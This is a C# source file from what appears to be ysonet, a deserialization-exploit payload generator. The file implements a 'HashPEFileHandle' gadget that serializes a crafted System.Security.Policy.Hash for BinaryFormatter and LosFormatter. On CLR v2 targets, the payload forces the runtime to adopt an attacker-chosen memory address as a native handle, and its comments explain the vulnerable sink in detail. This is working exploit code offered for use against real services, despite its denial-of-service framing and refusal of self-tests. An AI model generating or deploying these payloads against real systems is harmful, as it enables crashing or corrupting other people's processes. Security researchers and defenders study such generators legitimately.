using NDesk.Options;
using System;
using System.Collections.Generic;
using System.Globalization;
using System.IO;
using System.Runtime.Serialization;
using System.Text;
using ysonet.Helpers;

namespace ysonet.Generators
{
    /*
     * HashPEFileHandle: a CLR v2 denial-of-service / native-handle-corruption primitive. The
     * serialized System.Security.Policy.Hash carries an operator-chosen IntPtr member named PEFile;
     * the CLR-v2 Hash serialization constructor adopts it through the native _SetPEFileHandle path,
     * and later raw-data access or release/finalization may pass it to native _GetRawData or
     * _ReleasePEFile. An invalid or foreign handle can destabilize the target process.
     *
     * THE SINK, read out of CLR v2 mscorlib (Version=2.0.0.0, b77a5c561934e089),
     * System.Security.Policy.Hash. Its serialization constructor:
     *
     *   internal Hash(SerializationInfo info, StreamingContext context) {
     *       m_md5  = (byte[]) info.GetValueNoThrow("Md5",  typeof(byte[]));   // optional
     *       m_sha1 = (byte[]) info.GetValueNoThrow("Sha1", typeof(byte[]));   // optional
     *       m_peFile  = SafePEFileHandle.InvalidHandle;
     *       m_rawData = (byte[]) info.GetValue("RawData", typeof(byte[]));     // REQUIRED
     *       if (m_rawData == null) {
     *           IntPtr intPtr = (IntPtr) info.GetValue("PEFile", typeof(IntPtr));   // REQUIRED here
     *           if (intPtr != IntPtr.Zero)
     *               _SetPEFileHandle(intPtr, ref m_peFile);   // <- THE NATIVE ADOPTION
     *       }
     *   }
     *
     * So the payload sets RawData=null (to take the branch) and PEFile=<operator address>, with Md5
     * and Sha1 absent-or-null. The whole gadget is those four members on a Hash whose identity is
     * mscorlib 2.0.0.0.
     *
     * .NET FRAMEWORK 4 REMOVED THIS BRANCH. The 4.x Hash keeps m_peFile as a SafePEFileHandle and its
     * constructor no longer reads a raw IntPtr "PEFile" member, so this payload has no effect there.
     * That is why the version facet is CLR v2 only and why ordinary -t is refused: the isolated
     * self-test child runs the current framework and cannot reproduce a branch that framework does
     * not contain, so a "clean" child result would be a false negative, and an arbitrary pointer has
     * no safe automatic effect test anyway.
     *
     * THE WIRE, built through a readable ISerializable marshal rather than a stored blob. The marshal
     * names System.Security.Policy.Hash by SetType and writes the four members; because Hash and
     * IntPtr both live in mscorlib, BinaryFormatter records them as SystemClass entries (no explicit
     * assembly version), which bind to WHATEVER mscorlib the reader has - the v2 mscorlib on a CLR-v2
     * target. NormalizeToClrV2 is a defensive same-length rewrite that also forces any explicit
     * "Version=4.0.0.0" that a future framework might emit down to "Version=2.0.0.0", so a
     * current-runtime 4.0 identity can never travel as success. The exact bytes are asserted in
     * HashPEFileHandleTests.
     *
     * PEFile is a real System.IntPtr on the wire, not a boxed integer: HashIntPtrMarshal writes the
     * one Int64 named "value" that System.IntPtr's own GetObjectData writes, so a 32-bit ysonet
     * still emits a 64-bit address and the target's GetValue("PEFile", typeof(IntPtr)) finds a
     * real IntPtr.
     *
     * SAFETY. This is DENIAL OF SERVICE: declaring PayloadKind.DenialOfService is the single switch
     * that arms the acknowledgement, the bulk/tier exclusions, and the interactive handling. No
     * ysonet test deserializes this payload in any tier. Effect evidence is an operator-run manual
     * safe-adoption proof on a CLR-v2 lane, using a process-owned allocation and immediate SafeHandle
     * neutralization - never a crash, and never an automated row.
     *
     * NOT controlled memory read/write, not code execution, not cross-process handle opening. Premature
     * release, double release or use-after-free may be possible with a valid same-process handle, but
     * turning that into a controlled exploit needs an address source, native layout knowledge, and
     * separate evidence.
     */
    public class HashPEFileHandleGenerator : GenericGenerator
    {
        // The target, spelled out so the tests assert the exact names the payload has to carry.
        public const string HashClrName = "System.Security.Policy.Hash";
        // The 4.x identity SetType stamps here; NormalizeToClrV2 rewrites it to 2.0.0.0 if it ever
        // appears explicitly (it normally does not, because mscorlib types travel as SystemClass).
        public const string MscorlibV4DisplayName =
            "mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089";
        public const string HashV4TypeName = HashClrName + ", " + MscorlibV4DisplayName;

        // The four members the CLR-v2 constructor reads, by the names it reads them under.
        public const string Md5MemberName = "Md5";
        public const string Sha1MemberName = "Sha1";
        public const string RawDataMemberName = "RawData";
        public const string PEFileMemberName = "PEFile";

        // The version strings NormalizeToClrV2 swaps. Same length, so no length-prefix fixup.
        private const string V4Version = "Version=4.0.0.0";
        private const string V2Version = "Version=2.0.0.0";

        // ObjectStateFormatter markers/tokens for the LosFormatter wrapper.
        private const byte MarkerFormat = 0xFF;
        private const byte MarkerVersion1 = 0x01;
        private const byte TokenBinarySerialized = 50; // Token_BinarySerialized: a nested BinaryFormatter stream

        // ---- Metadata ----------------------------------------------------------

        public override GadgetFacetSet Facets()
        {
            return new GadgetFacetSet()
                // Denial of service: this is the one switch that arms the whole safety contract.
                .WithKinds(PayloadKind.DenialOfService)
                // -c is a target-process memory address, which is not a command, path or URL.
                .WithInputs(PayloadInput.Other)
                .WithRequirements(GadgetRequirement.BuiltIn, GadgetRequirement.NetFramework)
                // CLR v2 only: the branch this reaches was removed in .NET Framework 4. NetFx20 is
                // the family the manual safe-adoption proof establishes. A range across 2.0-3.5 is
                // claimed only after each CLR-v2 lane is separately proven.
                .WithVersions(RuntimeVersion.NetFx20);
        }

        public override string Finders()
        {
            return "Soroush Dalili";
        }

        public override string AdditionalInfo()
        {
            return "CLR v2 adopts -c as a native PE-file handle in System.Security.Policy.Hash, which "
                + "may later crash or corrupt the target process when native code consumes or releases "
                + "it. .NET 4 removed the branch. No code execution or memory read/write is proved.";
        }

        public override List<string> Labels()
        {
            return new List<string> { GadgetTags.Independent };
        }

        // The formatter families whose CLR-v2 wire the marshal below produces. BinaryFormatter is the
        // record stream; LosFormatter is the same corrected BinaryFormatter bytes wrapped in an
        // ObjectStateFormatter token-50 record. Both are advertised only from the manual CLR-v2
        // safe-adoption proof, never from generation alone.
        public override List<string> SupportedFormatters()
        {
            return new List<string>
            {
                Formatters.BinaryFormatter,
                Formatters.LosFormatter,
            };
        }

        // -c is the target-process address the Hash adopts as a PE-file handle.
        public override CommandInputType CommandInput()
        {
            return CommandInputType.MemoryAddress;
        }

        // ---- Generation --------------------------------------------------------

        public override object Generate(string formatter, InputArgs inputArgs)
        {
            long address = ParseAddress(inputArgs == null ? null : inputArgs.Cmd);

            // Refuse -t BEFORE anything is constructed or serialized. The isolated self-test child
            // runs the current framework (CLR v4), where this branch does not exist, so it could only
            // ever produce a false negative; and an arbitrary pointer has no safe automatic effect
            // test. This is the "refuse" outcome of the -t policy: hand the operator's bytes to
            // native code would damage the operator's own machine.
            if (inputArgs != null && inputArgs.Test)
                throw new ArgumentException(Name() + " refuses -t. Its effect is a CLR-v2 native "
                    + "PE-file-handle adoption that .NET 4 removed, so the isolated self-test child "
                    + "(current framework) cannot reproduce it, and an arbitrary pointer has no safe "
                    + "automatic effect test. Deserialize only in a CLR-v2 target you are testing, and "
                    + "see the module's manual safe-adoption proof.");

            if (!IsFormatter(formatter, Formatters.BinaryFormatter)
                && !IsFormatter(formatter, Formatters.LosFormatter))
                throw UnsupportedFormatter(formatter);

            // The corrected BinaryFormatter bytes are the root of both formats. Build them with the
            // self-test guaranteed off (it is, past the refusal above), so Serialize never
            // deserializes.
            InputArgs buildArgs = inputArgs == null ? new InputArgs() : inputArgs.DeepCopy();
            buildArgs.Test = false;
            byte[] bfBytes = NormalizeToClrV2((byte[])Serialize(
                new HashMarshal(address), Formatters.BinaryFormatter, buildArgs));

            // Both formats return the same bytes for either minify state: there is no second
            // meaningful minification of a binary record stream.
            if (IsFormatter(formatter, Formatters.BinaryFormatter))
                return bfBytes;

            // LosFormatter: wrap the corrected BinaryFormatter bytes in an ObjectStateFormatter
            // token-50 record and base64-encode, which is exactly what the product's LosFormatter
            // reader consumes (ObjectStateFormatter.DeserializeValue case 50 -> BinaryFormatter).
            return Convert.ToBase64String(WrapInObjectStateFormatterToken50(bfBytes));
        }

        // Force any explicit current-runtime mscorlib identity down to the CLR-v2 one. Same-length,
        // so no BinaryFormatter length prefix needs fixing. Normally a no-op: an mscorlib type is
        // written as a SystemClass record with no assembly string at all, so it already binds to the
        // reader's mscorlib. This exists so a 4.0.0.0 identity can never travel as success.
        private static byte[] NormalizeToClrV2(byte[] bytes)
        {
            byte[] from = Encoding.ASCII.GetBytes(V4Version);
            byte[] to = Encoding.ASCII.GetBytes(V2Version);
            for (int i = 0; i + from.Length <= bytes.Length; i++)
            {
                bool match = true;
                for (int j = 0; j < from.Length; j++)
                    if (bytes[i + j] != from[j]) { match = false; break; }
                if (match)
                {
                    Array.Copy(to, 0, bytes, i, to.Length);
                    i += to.Length - 1;
                }
            }
            return bytes;
        }

        private byte[] WrapInObjectStateFormatterToken50(byte[] bfBytes)
        {
            using (var ms = new MemoryStream())
            using (var writer = new BinaryWriter(ms))
            {
                writer.Write(MarkerFormat);
                writer.Write(MarkerVersion1);
                writer.Write(TokenBinarySerialized);
                Write7BitEncodedInt(writer, bfBytes.Length); // the length the reader reads back
                writer.Write(bfBytes);
                writer.Flush();
                return ms.ToArray();
            }
        }

        // The 7-bit-encoded int ObjectStateFormatter's SerializerBinaryWriter writes for the token-50
        // length. BinaryWriter.Write7BitEncodedInt is protected, so this is the same loop.
        private static void Write7BitEncodedInt(BinaryWriter writer, int value)
        {
            uint v = (uint)value;
            while (v >= 0x80)
            {
                writer.Write((byte)(v | 0x80));
                v >>= 7;
            }
            writer.Write((byte)v);
        }

        // ---- Input handling ----------------------------------------------------

        /// <summary>
        /// The operator's address, as 0x hex or decimal, signed or unsigned. It is PARSED rather than
        /// validated: every 64-bit bit pattern is accepted (a pointer is a bit pattern, not a
        /// magnitude), and it is never turned into a real IntPtr in this 32-bit process. Address
        /// validity is the target's business, not this generator's - the catalogue-wide rule that
        /// operator input is documented rather than policed.
        /// </summary>
        internal long ParseAddress(string raw)
        {
            string value = (raw ?? "").Trim();
            if (value.Length == 0)
                throw new ArgumentException(Name() + " needs -c \"<address>\", the target-process "
                    + "address the Hash adopts as a PE-file handle. Use hex (0x41414141) or decimal. "
                    + "No address is generated by default.");

            bool negative = value.StartsWith("-", StringComparison.Ordinal);
            if (negative || value.StartsWith("+", StringComparison.Ordinal))
                value = value.Substring(1).Trim();

            bool hex = value.StartsWith("0x", StringComparison.OrdinalIgnoreCase);
            if (hex)
                value = value.Substring(2);

            ulong parsed;
            bool ok = hex
                ? ulong.TryParse(value, NumberStyles.AllowHexSpecifier, CultureInfo.InvariantCulture, out parsed)
                : ulong.TryParse(value, NumberStyles.None, CultureInfo.InvariantCulture, out parsed);
            if (!ok)
                throw new ArgumentException(Name() + " cannot turn \"" + (raw ?? "") + "\" into an "
                    + "address. Give hex with a 0x prefix (0x41414141) or plain decimal digits; the "
                    + "value must fit in 64 bits.");

            long address = unchecked((long)parsed);
            return negative ? unchecked(-address) : address;
        }
    }

    // ---- The object graph ------------------------------------------------------

    // Emits System.Security.Policy.Hash without instantiating one (the 4.x Hash has no such
    // constructor path anyway) and without constructing an IntPtr (this process is 32-bit). SetType
    // names the target; the four members are written in the constructor's reading order, though only
    // the NAMES matter. RawData is null so the constructor takes the PEFile branch; Md5/Sha1 are null
    // (the constructor reads them with GetValueNoThrow).
    //
    // The marshal lives beside the generator, not nested inside it, because a marshal nested in a
    // generator class carries that generator's name: NetDataContractSerializer would otherwise put
    // this module's name in the payload's root element. (This module advertises BinaryFormatter and
    // LosFormatter, but the placement rule is kept so the choice is never accidentally wrong.)
    [Serializable]
    internal sealed class HashMarshal : ISerializable
    {
        private readonly long _address;

        internal HashMarshal(long address)
        {
            _address = address;
        }

        public void GetObjectData(SerializationInfo info, StreamingContext context)
        {
            // The 4.x Hash type only lends its assembly-qualified NAME here; NormalizeToClrV2 rewrites
            // the version if it is ever written explicitly. Its actual 4.x members are irrelevant -
            // SetType plus AddValue writes exactly the members named, regardless of the type's shape.
            info.SetType(Type.GetType(HashPEFileHandleGenerator.HashV4TypeName, true));

            info.AddValue(HashPEFileHandleGenerator.Md5MemberName, (byte[])null, typeof(byte[]));
            info.AddValue(HashPEFileHandleGenerator.Sha1MemberName, (byte[])null, typeof(byte[]));
            // PEFile is a real System.IntPtr on the wire (see HashIntPtrMarshal), declared as IntPtr
            // so the target's GetValue("PEFile", typeof(IntPtr)) finds it.
            info.AddValue(HashPEFileHandleGenerator.PEFileMemberName,
                new HashIntPtrMarshal(_address), typeof(IntPtr));
            // RawData null is what makes the constructor take the PEFile branch.
            info.AddValue(HashPEFileHandleGenerator.RawDataMemberName, (byte[])null, typeof(byte[]));
        }
    }

    // Stands in for System.IntPtr, which is itself [Serializable]/ISerializable and writes exactly one
    // Int64 named "value". Writing that Int64 directly lets a 32-bit ysonet emit a 64-bit address:
    // constructing a real IntPtr here would truncate it to the tool's own pointer width.
    [Serializable]
    internal sealed class HashIntPtrMarshal : ISerializable
    {
        private readonly long _value;

        internal HashIntPtrMarshal(long value)
        {
            _value = value;
        }

        public void GetObjectData(SerializationInfo info, StreamingContext context)
        {
            info.SetType(typeof(IntPtr));
            info.AddValue("value", _value);
        }
    }
}
